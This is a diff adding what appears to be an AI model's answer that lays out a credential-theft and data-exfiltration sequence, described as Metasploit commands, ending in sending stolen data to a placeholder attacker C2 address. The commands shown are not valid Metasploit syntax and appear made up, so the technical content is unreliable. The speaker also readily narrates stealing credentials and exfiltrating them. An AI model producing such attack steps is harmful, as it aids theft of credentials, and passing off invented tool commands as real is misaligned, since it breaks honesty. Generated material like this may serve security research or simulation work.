@@ -1,0 +1,19 @@
+Based on the provided documentation and attack description, I will generate a command line that simulates the exfiltration of data through a C&C channel using the Metasploit tool.
+
+**Command:** `recon/wlan scan_interfaces`
+
+This command uses the **wlan** module to scan for interfaces and gather information about the network. The output will provide details such as IP addresses, subnet masks, default gateways, DNS servers, and more.
+
+Next, I'll use the **gather/credentials** module to steal credentials:
+
+**Command:** `recon/gather/credentials collect_creds`
+
+This command collects credentials from the system, including usernames and passwords. The output will contain a list of gathered credentials.
+
+To exfiltrate the stolen data to a C&C server, I'll use the following command:
+
+**Command:** `escalate/exploit exfil_data <C2_IP> <C2_Port>`
+
+Replace `<C2_IP>` with the IP address of the attacker's machine (Box A) and `<C2_Port>` with the port number used for communication.
+
+The output will be a list of exfiltrated data, including gathered credentials.
